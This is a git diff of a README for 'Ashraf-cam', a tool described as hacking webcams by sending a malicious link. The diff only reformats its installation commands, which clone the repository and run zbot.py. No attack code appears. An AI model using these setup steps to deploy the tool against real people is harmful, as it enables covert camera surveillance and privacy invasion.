@@ -28,27 +28,31 @@ Hack webcam using python by sending malicious link.
 ## INSTALLATION for TERMINAL:
 # installation
 
-apt update -y
+*`apt update -y`
 
-apt upgrade -y
+*`apt upgrade -y`
 
-apt install git -y
+*`apt install git -y`
 
-pkg install python
+*`pkg install python`
 
-pkg install python2 -y
-pkg install git
-pip install requests
-pip install setuptools
-pip2 install mechanize
+*`pkg install python2 -y`
 
-git clone https://github.com/ashrafaliqhtan/Ashraf-cam.git
+*`pkg install git`
 
-cd Ashraf-cam
+*`pip install requests`
 
-pip install -r requirements.txt
+*`pip install setuptools`
 
-python3 zbot.py
+*`pip2 install mechanize`
+
+*`git clone https://github.com/ashrafaliqhtan/Ashraf-cam.git`
+
+*`cd Ashraf-cam`
+
+*`pip install -r requirements.txt`
+
+*`python3 zbot.py`
 
 ## INSTALLATION for HEROKU: (beta testing)
 * `Heroku version of script is still under test. You can work on it if you like. I'll inform when its up.`
